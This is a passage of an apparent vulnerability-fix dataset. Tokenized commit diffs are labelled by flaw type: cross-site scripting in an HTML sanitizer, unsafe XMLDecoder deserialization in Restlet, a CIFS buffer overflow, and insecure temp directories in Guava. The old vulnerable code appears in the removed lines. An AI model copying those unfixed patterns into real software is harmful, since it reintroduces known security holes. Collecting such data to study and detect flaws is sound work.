"(", "){", "return", "this", ".", "isValid", "(", ")?", "this", ".", "_milliseconds", "+", "864e5", "*", "this", ".", "_days", "+", "this", ".", "_months", "%", "12", "*", "2592e6", "+", "31536e6", "*", "g", "(", "this", ".", "_months", "/", "12", ")", ":", "NaN", "}", ",", "An", ".", "_bubble", "=", "function", "(", "){", "var", "e", ",", "t", ",", "n", ",", "s", ",", "i", ",", "r", "=", "this", ".", "_milliseconds", ",", "a", "=", "this", ".", "_days", ",", "o", "=", "this", ".", "_months", ",", "u", "=", "this", ".", "_data", ";", "return", "r", ">", "=", "0", "&", "&", "a", ">", "=", "0", "&", "&", "o", ">", "=", "0", "|", "|", "r", "<", "=", "0", "&", "&", "a", "<", "=", "0", "&", "&", "o", "<", "=", "0", "|", "|(", "r", "+", "=", "864e5", "*", "Ae", "(", "Ze", "(", "o", ")", "+", "a", ")", ",", "a", "=", "0", ",", "o", "=", "0", ")", ",", "u", ".", "milliseconds", "=", "r", "%", "1e3", ",", "e", "=", "y", "(", "r", "/", "1e3", ")", ",", "u", ".", "seconds", "=", "e", "%", "60", ",", "t", "=", "y", "(", "e", "/", "60", ")", ",", "u", ".", "minutes", "=", "t", "%", "60", ",", "n", "=", "y", "(", "t", "/", "60", ")", ",", "u", ".", "hours", "=", "n", "%", "24", ",", "a", "+", "=", "y", "(", "n", "/", "24", ")", ",", "i", "=", "y", "(", "ze", "(", "a", ")", "),", "o", "+", "=", "i", ",", "a", "-", "=", "Ae", "(", "Ze", "(", "i", ")", "),", "s", "=", "y", "(", "o", "/", "12", ")", ",", "o", "%", "=", "12", ",", "u", ".", "days", "=", "a", ",", "u", ".", "months", "=", "o", ",", "u", ".", "years", "=", "s", ",", "this", "}", ",", "An", ".", "clone", "=", "function", "(", "){", "return", "Te", "(", "this", ")", "},", "An", ".", "get", "=", "function", "(", "e", ")", "{", "return", "e", "=", "O", "(", "e", ")", ",", "this", ".", "isValid", "(", ")?", "this", "[", "e", "+", "\"", "s", "\"", "](", "):", "NaN", "}", ",", "An", ".", "milliseconds", "=", "Fn", ",", "An", ".", "seconds", "=", "Un", ",", "An", ".", "minutes", "=", "Nn", ",", "An", ".", "hours", "=", "Hn", ",", "An", ".", "days", "=", "Ln", ",", "An", ".", "weeks", "=", "function", "(", "){", "return", "y", "(", "this", ".", "days", "(", ")/", "7", ")", "},", "An", ".", "months", "=", "Gn", ",", "An", ".", "years", "=", "Vn", ",", "An", ".", "humanize", "=", "function", "(", "e", ")", "{", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "this", ".", "localeData", "(", ").", "invalidDate", "(", ");", "var", "t", "=", "this", ".", "localeData", "(", "),", "n", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", "=", "Te", "(", "e", ")", ".", "abs", "(", "),", "i", "=", "jn", "(", "s", ".", "as", "(", "\"", "s", "\"", "))", ",", "r", "=", "jn", "(", "s", ".", "as", "(", "\"", "m", "\"", "))", ",", "a", "=", "jn", "(", "s", ".", "as", "(", "\"", "h", "\"", "))", ",", "o", "=", "jn", "(", "s", ".", "as", "(", "\"", "d", "\"", "))", ",", "u", "=", "jn", "(", "s", ".", "as", "(", "\"", "M", "\"", "))", ",", "l", "=", "jn", "(", "s", ".", "as", "(", "\"", "y", "\"", "))", ",", "d", "=", "i", "<", "=", "In", ".", "ss", "&", "&[", "\"", "s", "\"", ",", "i", "]", "||", "i", "<", "In", ".", "s", "&", "&[", "\"", "ss", "\"", ",", "i", "]", "||", "r", "<", "=", "1", "&", "&[", "\"", "m", "\"", "]|", "|", "r", "<", "In", ".", "m", "&", "&[", "\"", "mm", "\"", ",", "r", "]", "||", "a", "<", "=", "1", "&", "&[", "\"", "h", "\"", "]|", "|", "a", "<", "In", ".", "h", "&", "&[", "\"", "hh", "\"", ",", "a", "]", "||", "o", "<", "=", "1", "&", "&[", "\"", "d", "\"", "]|", "|", "o", "<", "In", ".", "d", "&", "&[", "\"", "dd", "\"", ",", "o", "]", "||", "u", "<", "=", "1", "&", "&[", "\"", "M", "\"", "]|", "|", "u", "<", "In", ".", "M", "&", "&[", "\"", "MM", "\"", ",", "u", "]", "||", "l", "<", "=", "1", "&", "&[", "\"", "y", "\"", "]|", "|[", "\"", "yy", "\"", ",", "l", "]", ";", "return", "d", "[", "2", "]", "=", "t", ",", "d", "[", "3", "]", "=+", "e", ">", "0", ",", "d", "[", "4", "]", "=", "n", ",", "function", "(", "e", ",", "t", ",", "n", ",", "s", ",", "i", ")", "{", "return", "i", ".", "relativeTime", "(", "t", "|", "|", "1", ",", "!!", "n", ",", "e", ",", "s", ")", "}.", "apply", "(", "null", ",", "d", ")", "}(", "this", ",", "!", "e", ",", "t", ")", ";", "return", "e", "&", "&(", "n", "=", "t", ".", "pastFuture", "(", "+", "this", ",", "n", ")", "),", "t", ".", "postformat", "(", "n", ")", "},", "An", ".", "toISOString", "=", "Be", ",", "An", ".", "toString", "=", "Be", ",", "An", ".", "toJSON", "=", "Be", ",", "An", ".", "locale", "=", "Fe", ",", "An", ".", "localeData", "=", "Ue", ",", "An", ".", "toIsoString", "=", "v", "(", "\"", "toIsoString", "(", ")", "is", "deprecated", ".", "Please", "use", "toISOString", "(", ")", "instead", "(", "notice", "the", "capitals", ")", "\",", "Be", ")", ",", "An", ".", "lang", "=", "gn", ",", "P", "(", "\"", "X", "\"", ",", "0", ",", "0", ",", "\"", "unix", "\"", "),", "P", "(", "\"", "x", "\"", ",", "0", ",", "0", ",", "\"", "valueOf", "\"", "),", "F", "(", "\"", "x", "\"", ",", "Mt", ")", ",", "F", "(", "\"", "X", "\"", ",/", "[+", "-]", "?\\", "d", "+", "(\\", ".\\", "d", "{", "1", ",", "3", "}", ")?", "/)", ",", "H", "(", "\"", "X", "\"", ",", "function", "(", "e", ",", "t", ",", "n", ")", "{", "n", ".", "_d", "=", "new", "Date", "(", "1e3", "*", "parseFloat", "(", "e", ",", "10", ")", ")}", "),", "H", "(", "\"", "x", "\"", ",", "function", "(", "e", ",", "t", ",", "n", ")", "{", "n", ".", "_d", "=", "new", "Date", "(", "g", "(", "e", ")", ")}", "),", "e", ".", "version", "=", "\"", "2", ".", "19", ".", "3", "\"", ",", "function", "(", "e", ")", "{", "Qe", "=", "e", "}", "(", "pe", ")", ",", "e", ".", "fn", "=", "Sn", ",", "e", ".", "min", "=", "function", "(", "){", "return", "we", "(", "\"", "isBefore", "\"", ",[", "].", "slice", ".", "call", "(", "arguments", ",", "0", ")", ")}", ",", "e", ".", "max", "=", "function", "(", "){", "return", "we", "(", "\"", "isAfter", "\"", ",[", "].", "slice", ".", "call", "(", "arguments", ",", "0", ")", ")}", ",", "e", ".", "now", "=", "function", "(", "){", "return", "Date", ".", "now", "?", "Date", ".", "now", "(", "):", "+", "new", "Date", "}", ",", "e", ".", "utc", "=", "l", ",", "e", ".", "unix", "=", "function", "(", "e", ")", "{", "return", "pe", "(", "1e3", "*", "e", ")", "},", "e", ".", "months", "=", "function", "(", "e", ",", "t", ")", "{", "return", "je", "(", "e", ",", "t", ",", "\"", "months", "\"", ")}", ",", "e", ".", "isDate", "=", "r", ",", "e", ".", "locale", "=", "ae", ",", "e", ".", "invalid", "=", "c", ",", "e", ".", "duration", "=", "Te", ",", "e", ".", "isMoment", "=", "_", ",", "e", ".", "weekdays", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "return", "Ie", "(", "e", ",", "t", ",", "n", ",", "\"", "weekdays", "\"", ")}", ",", "e", ".", "parseZone", "=", "function", "(", "){", "return", "pe", ".", "apply", "(", "null", ",", "arguments", ")", ".", "parseZone", "(", ")}", ",", "e", ".", "localeData", "=", "ue", ",", "e", ".", "isDuration", "=", "Me", ",", "e", ".", "monthsShort", "=", "function", "(", "e", ",", "t", ")", "{", "return", "je", "(", "e", ",", "t", ",", "\"", "monthsShort", "\"", ")}", ",", "e", ".", "weekdaysMin", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "return", "Ie", "(", "e", ",", "t", ",", "n", ",", "\"", "weekdaysMin", "\"", ")}", ",", "e", ".", "defineLocale", "=", "oe", ",", "e", ".", "updateLocale", "=", "function", "(", "e", ",", "t", ")", "{", "if", "(", "null", "!", "=", "t", ")", "{", "var", "n", ",", "s", ",", "i", "=", "Qt", ";", "null", "!", "=(", "s", "=", "re", "(", "e", ")", ")&", "&(", "i", "=", "s", ".", "_config", ")", ",(", "n", "=", "new", "D", "(", "t", "=", "S", "(", "i", ",", "t", ")", "))", ".", "parentLocale", "=", "Xt", "[", "e", "]", ",", "Xt", "[", "e", "]", "=", "n", ",", "ae", "(", "e", ")", "}", "else", "null", "!", "=", "Xt", "[", "e", "]", "&&", "(", "null", "!", "=", "Xt", "[", "e", "]", ".", "parentLocale", "?", "Xt", "[", "e", "]", "=", "Xt", "[", "e", "]", ".", "parentLocale", ":", "null", "!", "=", "Xt", "[", "e", "]", "&&", "delete", "Xt", "[", "e", "]", ");", "return", "Xt", "[", "e", "]", "},", "e", ".", "locales", "=", "function", "(", "){", "return", "nt", "(", "Xt", ")", "},", "e", ".", "weekdaysShort", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "return", "Ie", "(", "e", ",", "t", ",", "n", ",", "\"", "weekdaysShort", "\"", ")}", ",", "e", ".", "normalizeUnits", "=", "O", ",", "e", ".", "relativeTimeRounding", "=", "function", "(", "e", ")", "{", "return", "void", "0", "=", "==", "e", "?", "jn", ":", "\"", "function", "\"", "==", "typeof", "e", "&", "&(", "jn", "=", "e", ",", "!", "0", ")", "},", "e", ".", "relativeTimeThreshold", "=", "function", "(", "e", ",", "t", ")", "{", "return", "void", "0", "!", "==", "In", "[", "e", "]", "&&", "(", "void", "0", "=", "==", "t", "?", "In", "[", "e", "]", ":(", "In", "[", "e", "]", "=", "t", ",", "\"", "s", "\"", "==", "=", "e", "&", "&(", "In", ".", "ss", "=", "t", "-", "1", ")", ",!", "0", ")", ")}", ",", "e", ".", "calendarFormat", "=", "function", "(", "e", ",", "t", ")", "{", "var", "n", "=", "e", ".", "diff", "(", "t", ",", "\"", "days", "\"", ",!", "0", ")", ";", "return", "n", "<", "-", "6", "?", "\"", "sameElse", "\"", ":", "n", "<", "-", "1", "?", "\"", "lastWeek", "\"", ":", "n", "<", "0", "?", "\"", "lastDay", "\"", ":", "n", "<", "1", "?", "\"", "sameDay", "\"", ":", "n", "<", "2", "?", "\"", "nextDay", "\"", ":", "n", "<", "7", "?", "\"", "nextWeek", "\"", ":\"", "sameElse", "\"", "},", "e", ".", "prototype", "=", "Sn", ",", "e", "}", ");", "@", "@", "-", "117", ",", "7", "+", "117", ",", "7", "@", "@", "public", "String", "getEditorMarkupId", "(", ")", "@", "Override", "protected", "void", "convertInput", "(", ")", "{", "final", "PolicyFactory", "policy", "=", "newPolicyFactory", "(", ");", "final", "PolicyFactory", "policy", "=", "this", ".", "newPolicyFactory", "(", ");", "final", "String", "input", "=", "this", ".", "textarea", ".", "getConvertedInput", "(", ");", "this", ".", "setConvertedInput", "(", "policy", ".", "sanitize", "(", "input", ")", ");", "@", "@", "-", "191", ",", "7", "+", "191", ",", "7", "@", "@", "protected", "void", "onComponentTag", "(", "ComponentTag", "tag", ")", "*", "*", "@", "return", "a", "new", "{", "@", "code", "PolicyFactory", "}", "*", "/", "protected", "static", "PolicyFactory", "newPolicyFactory", "(", ")", "protected", "PolicyFactory", "newPolicyFactory", "(", ")", "{", "return", "new", "HtmlPolicyBuilder", "(", ")", "/", "/", "lf", ".", "allowCommonInlineFormattingElements", "(", ")", "/", "/", "lf", "@", "@", "-", "95", ",", "7", "+", "95", ",", "7", "@", "@", "public", "void", "convertInput", "(", ")", "{", "super", ".", "convertInput", "(", ");", "final", "PolicyFactory", "policy", "=", "newPolicyFactory", "(", ");", "final", "PolicyFactory", "policy", "=", "this", ".", "newPolicyFactory", "(", ");", "final", "String", "input", "=", "this", ".", "getConvertedInput", "(", ");", "this", ".", "setConvertedInput", "(", "policy", ".", "sanitize", "(", "input", ")", ");", "@", "@", "-", "139", ",", "7", "+", "139", ",", "7", "@", "@", "public", "JQueryBehavior", "newWidgetBehavior", "(", "String", "selector", ")", "*", "*", "@", "return", "a", "new", "{", "@", "code", "PolicyFactory", "}", "*", "/", "protected", "static", "PolicyFactory", "newPolicyFactory", "(", ")", "protected", "PolicyFactory", "newPolicyFactory", "(", ")", "{", "return", "new", "HtmlPolicyBuilder", "(", ")", "/", "/", "lf", ".", "allowCommonInlineFormattingElements", "(", ")", "/", "/", "lf"], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["Fixed", "issue", "#774", "-", "Removed", "default", "support", "of", "JavaBeans", "XML-serialization.", "Reported", "by", "David", "Jorm,", "Dinis", "Cruz,", "Abraham", "Kang", "and", "alavaro", "Munoz."], "code_tokens": ["@", "@", "-", "13", ",", "6", "+", "13", ",", "8", "@", "@", "Changes", "log", "-", "Fixed", "issue", "#", "757", "-", "Infinite", "Loop", "in", "Feed", ".", "-", "Fixed", "issue", "#", "753", "-", "Date", "concurrency", "issue", "due", "to", "broken", "caching", "attempts", ".", "Reported", "by", "@", "effad", ".", "Solved", "by", "Robert", "Fischer", "and", "Tim", "Peierls", ".", "-", "Fixed", "issue", "#", "774", "-", "Removed", "default", "support", "of", "JavaBeans", "XML", "-", "serialization", ".", "Reported", "by", "David", "Jorm", ",", "Dinis", "Cruz", ",", "Abraham", "Kang", "and", "alavaro", "Munoz", ".", "-", "Misc", "-", "Added", "log", "warning", "when", "an", "authentication", "scheme", "does", "not", "define", "a", "\"", "realm", "\"", "parameter", ".", "Reported", "by", "Lo", "\u00ef", "c", "Oudot", "(", "#", "759", ")", ".", "@", "@", "-", "78", ",", "6", "+", "78", ",", "10", "@", "@", "private", "static", "final", "VariantInfo", "VARIANT_OBJECT_XML", "=", "new", "VariantInfo", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ")", ";", "/", "**", "Indicates", "whether", "the", "JavaBeans", "XML", "deserialization", "is", "supported", "or", "not", ".", "*", "/", "private", "static", "final", "boolean", "VARIANT_OBJECT_XML_SUPPORTED", "=", "Boolean", ".", "getBoolean", "(", "\"", "org", ".", "restlet", ".", "engine", ".", "converter", ".", "DefaultConverter", ".", "VARIANT_OBJECT_XML_SUPPORTED", "\"", ");", "@", "Override", "public", "List", "<", "Class", "<", "?>", ">", "getObjectClasses", "(", "Variant", "source", ")", "{", "List", "<", "Class", "<", "?>", ">", "result", "=", "null", ";", "@", "@", "-", "90", ",", "7", "+", "94", ",", "8", "@", "@", "MediaType", "mediaType", "=", "source", ".", "getMediaType", "(", ");", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT", ".", "equals", "(", "mediaType", ")", "|", "|", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "mediaType", ")", ")", "{", "|", "|", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "mediaType", ")", "))", "{", "result", "=", "addObjectClass", "(", "result", ",", "Object", ".", "class", ")", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_WWW_FORM", ".", "equals", "(", "mediaType", ")", ")", "{", "result", "=", "addObjectClass", "(", "result", ",", "Form", ".", "class", ")", ";", "@", "@", "-", "123", ",", "7", "+", "128", ",", "9", "@", "@", "result", "=", "addVariant", "(", "result", ",", "VARIANT_FORM", ")", ";", "}", "else", "if", "(", "Serializable", ".", "class", ".", "isAssignableFrom", "(", "source", ")", ")", "{", "result", "=", "addVariant", "(", "result", ",", "VARIANT_OBJECT", ")", ";", "result", "=", "addVariant", "(", "result", ",", "VARIANT_OBJECT_XML", ")", ";", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", ")", "{", "result", "=", "addVariant", "(", "result", ",", "VARIANT_OBJECT_XML", ")", ";", "}", "}", "}", "@", "@", "-", "160", ",", "11", "+", "167", ",", "13", "@", "@", "public", "float", "score", "(", "Object", "source", ",", "Variant", "target", ",", "Resource", "resource", ")", "{", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT", ".", "isCompatible", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "0", ".", "6F", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "}", "else", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "1", ".", "0F", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "isCompatible", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "}", "else", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "isCompatible", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "0", ".", "6F", ";", "}", "}", "else", "{", "@", "@", "-", "216", ",", "11", "+", "225", ",", "13", "@", "@", "public", "float", "score", "(", "Object", "source", ",", "Variant", "target", ",", "Resource", "resource", ")", "{", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT", ".", "isCompatible", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "0", ".", "6F", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "}", "else", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "1", ".", "0F", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "isCompatible", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "}", "else", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "isCompatible", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "0", ".", "6F", ";", "}", "else", "{", "result", "=", "0", ".", "5F", ";", "@", "@", "-", "331", ",", "8", "+", "342", ",", "10", "@", "@", "public", "Representation", "toRepresentation", "(", "Object", "source", ",", "Variant", "target", ",", "}", "else", "if", "(", "Serializable", ".", "class", ".", "isAssignableFrom", "(", "entity", ")", ")", "{", "updatePreferences", "(", "preferences", ",", "MediaType", ".", "APPLICATION_JAVA_OBJECT", ",", "1", ".", "0F", ")", ";", "updatePreferences", "(", "preferences", ",", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ",", "1", ".", "0F", ")", ";", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", ")", "{", "updatePreferences", "(", "preferences", ",", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ",", "1", ".", "0F", ")", ";", "}", "}", "else", "if", "(", "String", ".", "class", ".", "isAssignableFrom", "(", "entity", ")", "|", "|", "Reader", ".", "class", ".", "isAssignableFrom", "(", "entity", ")", ")", "{", "updatePreferences", "(", "preferences", ",", "MediaType", ".", "TEXT_PLAIN", ",", "1", ".", "0F", ")", ";", "@", "@", "-", "43", ",", "7", "+", "43", ",", "26", "@", "@", "import", "org", ".", "restlet", ".", "data", ".", "MediaType", ";", "/", "**", "*", "Representation", "based", "on", "a", "serializable", "Java", "object", ".", "*", "Representation", "based", "on", "a", "serializable", "Java", "object", ".", "<", "br", ">", "*", "It", "supports", "binary", "representations", "of", "JavaBeans", "using", "the", "*", "{", "@", "link", "ObjectInputStream", "}", "and", "{", "@", "link", "ObjectOutputStream", "}", "classes", ".", "In", "this", "*", "case", ",", "it", "handles", "representations", "having", "the", "following", "media", "type", ":", "*", "{", "@", "link", "MediaType", "#", "APPLICATION_JAVA_OBJECT", "}", "*", "(", "\"", "application", "/", "x", "-", "java", "-", "serialized", "-", "object", "\"", ").", "It", "also", "supports", "textual", "*", "representations", "of", "JavaBeans", "using", "the", "{", "@", "link", "XMLEncoder", "}", "and", "*", "{", "@", "link", "XMLDecoder", "}", "classes", ".", "In", "this", "case", ",", "it", "handles", "representations", "having", "*", "the", "following", "media", "type", ":", "{", "@", "link", "MediaType", "#", "APPLICATION_JAVA_OBJECT_XML", "}", "*", "(", "\"", "application", "/", "x", "-", "java", "-", "serialized", "-", "object", "+", "xml", "\"", ").", "*", "*", "SECURITY", "WARNING", ":", "The", "usage", "of", "{", "@", "link", "XMLDecoder", "}", "when", "deserializing", "XML", "*", "presentations", "from", "unstrusted", "sources", "can", "lead", "to", "malicious", "attacks", ".", "As", "*", "pointed", "<", "a", "href", "=", "*", "\"", "http", ":", "//", "blog", ".", "diniscruz", ".", "com", "/", "2013", "/", "08", "/", "using", "-", "xmldecoder", "-", "to", "-", "execute", "-", "server", "-", "side", ".", "html", "\"", "*", ">", "here", "<", "/", "a", ">", ",", "the", "{", "@", "link", "XMLDecoder", "}", "is", "able", "to", "force", "the", "JVM", "to", "execute", "*", "unwanted", "Java", "code", "described", "inside", "the", "XML", "file", ".", "Thus", ",", "the", "support", "of", "such", "*", "format", "has", "been", "disactivated", "by", "default", "inside", "the", "default", "converter", ".", "You", "can", "*", "activate", "this", "support", "by", "turning", "on", "the", "following", "system", "property", ":", "*", "org", ".", "restlet", ".", "engine", ".", "converter", ".", "DefaultConverter", ".", "VARIANT_OBJECT_XML_SUPPORTED", ".", "*", "*", "@", "author", "Jerome", "Louvel", "*", "@", "param", "<", "T", ">"], "docstring_tokens": ["xml", "deserialization"]}
{"contents": ["cifs:", "fix", "unicode", "string", "area", "word", "alignment", "in", "session", "setup", "The", "handling", "of", "unicode", "string", "area", "alignment", "is", "wrong.", "decode_unicode_ssetup", "improperly", "assumes", "that", "it", "will", "always", "be", "preceded", "by", "a", "pad", "byte.", "This", "isn't", "the", "case", "if", "the", "string", "area", "is", "already", "word-aligned.", "This", "problem,", "combined", "with", "the", "bad", "buffer", "sizing", "for", "the", "serverDomain", "string", "can", "cause", "memory", "corruption.", "The", "bad", "alignment", "can", "make", "it", "so", "that", "the", "alignment", "of", "the", "characters", "is", "off.", "This", "can", "make", "them", "translate", "to", "characters", "that", "are", "greater", "than", "2", "bytes", "each.", "If", "this", "happens", "we", "can", "overflow", "the", "allocation.", "Fix", "this", "by", "fixing", "the", "alignment", "in", "CIFS_SessSetup", "instead", "so", "we", "can", "verify", "it", "against", "the", "head", "of", "the", "response.", "Also,", "clean", "up", "the", "workaround", "for", "improperly", "terminated", "strings", "by", "checking", "for", "a", "odd-length", "unicode", "buffers", "and", "then", "forcibly", "terminating", "them.", "Finally,", "resize", "the", "buffer", "for", "serverDomain.", "Now", "that", "we've", "fixed", "the", "alignment,", "it's", "probably", "fine,", "but", "a", "malicious", "server", "could", "overflow", "it.", "A", "better", "solution", "for", "handling", "these", "strings", "is", "still", "needed,", "but", "this", "should", "be", "a", "suitable", "bandaid.", "Signed-off-by:", "Jeff", "Layton", "<jlayton@redhat.com>", "CC:", "Stable", "<stable@vger.kernel.org>", "Signed-off-by:", "Steve", "French", "<sfrench@us.ibm.com>"], "code_tokens": ["@", "@", "-", "285", ",", "27", "+", "285", ",", "26", "@", "@", "static", "int", "decode_unicode_ssetup", "(", "char", "*", "*", "pbcc_area", ",", "int", "bleft", ",", "int", "words_left", ",", "len", ";", "char", "*", "data", "=", "*", "pbcc_area", ";", "cFYI", "(", "1", ",", "(", "\"", "bleft", "%", "d", "\"", ",", "bleft", ")", ");", "/", "*", "SMB", "header", "is", "unaligned", ",", "so", "cifs", "servers", "word", "align", "start", "of", "Unicode", "strings", "*", "/", "data", "+", "+;", "bleft", "-", "-;", "/", "*", "Windows", "servers", "do", "not", "always", "double", "null", "terminate", "their", "final", "Unicode", "string", "-", "in", "which", "case", "we", "now", "will", "not", "attempt", "to", "decode", "the", "byte", "of", "junk", "which", "follows", "it", "*", "/", "/", "*", "*", "Windows", "servers", "do", "not", "always", "double", "null", "terminate", "their", "final", "*", "Unicode", "string", ".", "Check", "to", "see", "if", "there", "are", "an", "uneven", "number", "of", "bytes", "*", "left", ".", "If", "so", ",", "then", "add", "an", "extra", "NULL", "pad", "byte", "to", "the", "end", "of", "the", "*", "response", ".", "*", "*", "See", "section", "2", ".", "7", ".", "2", "in", "\"", "Implementing", "CIFS", "\"", "for", "details", "*", "/", "if", "(", "bleft", "%", "2", ")", "{", "data", "[", "bleft", "]", "=", "0", ";", "+", "+", "bleft", ";", "}", "words_left", "=", "bleft", "/", "2", ";", "/", "*", "save", "off", "server", "operating", "system", "*", "/", "len", "=", "UniStrnlen", "(", "(", "wchar_t", "*", ")", "data", ",", "words_left", ")", ";", "/", "*", "We", "look", "for", "obvious", "messed", "up", "bcc", "or", "strings", "in", "response", "so", "we", "do", "not", "go", "off", "the", "end", "since", "(", "at", "least", ")", "WIN2K", "and", "Windows", "XP", "have", "a", "major", "bug", "in", "not", "null", "terminating", "last", "Unicode", "string", "in", "response", "*", "/", "if", "(", "len", ">", "=", "words_left", ")", "return", "rc", ";", "@", "@", "-", "343", ",", "13", "+", "342", ",", "10", "@", "@", "static", "int", "decode_unicode_ssetup", "(", "char", "*", "*", "pbcc_area", ",", "int", "bleft", ",", "return", "rc", ";", "kfree", "(", "ses", "-", ">", "serverDomain", ")", ";", "ses", "-", ">", "serverDomain", "=", "kzalloc", "(", "2", "*", "(", "len", "+", "1", ")", ",", "GFP_KERNEL", ")", ";", "/", "*", "BB", "FIXME", "wrong", "length", "*", "/", "if", "(", "ses", "-", ">", "serverDomain", "!", "=", "NULL", ")", "{", "ses", "-", ">", "serverDomain", "=", "kzalloc", "(", "(", "4", "*", "len", ")", "+", "2", ",", "GFP_KERNEL", ")", ";", "if", "(", "ses", "-", ">", "serverDomain", "!", "=", "NULL", ")", "cifs_strfromUCS_le", "(", "ses", "-", ">", "serverDomain", ",", "(", "__le16", "*", ")", "data", ",", "len", ",", "nls_cp", ")", ";", "ses", "-", ">", "serverDomain", "[", "2", "*", "len", "]", "=", "0", ";", "ses", "-", ">", "serverDomain", "[", "(", "2", "*", "len", ")", "+", "1", "]", "=", "0", ";", "}", "data", "+", "=", "2", "*", "(", "len", "+", "1", ")", ";", "words_left", "-", "=", "len", "+", "1", ";", "@", "@", "-", "702", ",", "12", "+", "698", ",", "18", "@", "@", "CIFS_SessSetup", "(", "unsigned", "int", "xid", ",", "struct", "cifsSesInfo", "*", "ses", ",", "int", "first_time", ",", "}", "/", "*", "BB", "check", "if", "Unicode", "and", "decode", "strings", "*", "/", "if", "(", "smb_buf", "-", ">", "Flags2", "&", "SMBFLG2_UNICODE", ")", "if", "(", "smb_buf", "-", ">", "Flags2", "&", "SMBFLG2_UNICODE", ")", "{", "/", "*", "unicode", "string", "area", "must", "be", "word", "-", "aligned", "*", "/", "if", "(", "((", "unsigned", "long", ")", "bcc_ptr", "-", "(", "unsigned", "long", ")", "smb_buf", ")", "%", "2", ")", "{", "+", "+", "bcc_ptr", ";", "-", "-", "bytes_remaining", ";", "}", "rc", "=", "decode_unicode_ssetup", "(", "&", "bcc_ptr", ",", "bytes_remaining", ",", "ses", ",", "nls_cp", ")", ";", "else", "ses", ",", "nls_cp", ")", ";", "}", "else", "{", "rc", "=", "decode_ascii_ssetup", "(", "&", "bcc_ptr", ",", "bytes_remaining", ",", "ses", ",", "nls_cp", ")", ";", "}", "ssetup_exit", ":", "if", "(", "spnego_key", ")", "{"], "docstring_tokens": ["a", "buffer", "overflow"]}
{"contents": ["Deprecate", "Files.createTempDir(),", "noting", "that", "better", "alternatives", "exist", "for", "Android", "as", "well", "as", "for", "users", "running", "Java", "7", "or", "later.", "RELNOTES=`io`:", "Deprecated", "`Files.createTempDir()`.", "-------------", "Created", "by", "MOE:", "https://github.com/google/moe", "MOE_MIGRATED_REVID=328552787"], "code_tokens": ["@", "@", "-", "398", ",", "6", "+", "398", ",", "11", "@", "@", "public", "static", "boolean", "equal", "(", "File", "file1", ",", "File", "file2", ")", "throws", "IOException", "{", "*", "be", "exploited", "to", "create", "security", "vulnerabilities", ",", "especially", "when", "executable", "files", "are", "to", "be", "*", "written", "into", "the", "directory", ".", "*", "*", "<", "p", ">", "Depending", "on", "the", "environmment", "that", "this", "code", "is", "run", "in", ",", "the", "system", "temporary", "directory", "(", "and", "*", "thus", "the", "directory", "this", "method", "creates", ")", "may", "be", "more", "visible", "that", "a", "program", "would", "like", "-", "files", "*", "written", "to", "this", "directory", "may", "be", "read", "or", "overwritten", "by", "hostile", "programs", "running", "on", "the", "same", "*", "machine", ".", "*", "*", "<", "p", ">", "This", "method", "assumes", "that", "the", "temporary", "volume", "is", "writable", ",", "has", "free", "inodes", "and", "free", "blocks", ",", "*", "and", "that", "it", "will", "not", "be", "called", "thousands", "of", "times", "per", "second", ".", "*", "@", "@", "-", "406", ",", "8", "+", "411", ",", "15", "@", "@", "public", "static", "boolean", "equal", "(", "File", "file1", ",", "File", "file2", ")", "throws", "IOException", "{", "*", "*", "@", "return", "the", "newly", "-", "created", "directory", "*", "@", "throws", "IllegalStateException", "if", "the", "directory", "could", "not", "be", "created", "*", "@", "deprecated", "For", "Android", "users", ",", "see", "the", "<", "a", "*", "href", "=", "\"", "https", ":", "//", "developer", ".", "android", ".", "com", "/", "training", "/", "data", "-", "storage", "\"", "target", "=", "\"", "_blank", "\"", ">", "Data", "and", "File", "*", "Storage", "overview", "<", "/", "a", ">", "to", "select", "an", "appropriate", "temporary", "directory", "(", "perhaps", "{", "@", "code", "*", "context", ".", "getCacheDir", "(", ")}", ").", "For", "developers", "on", "Java", 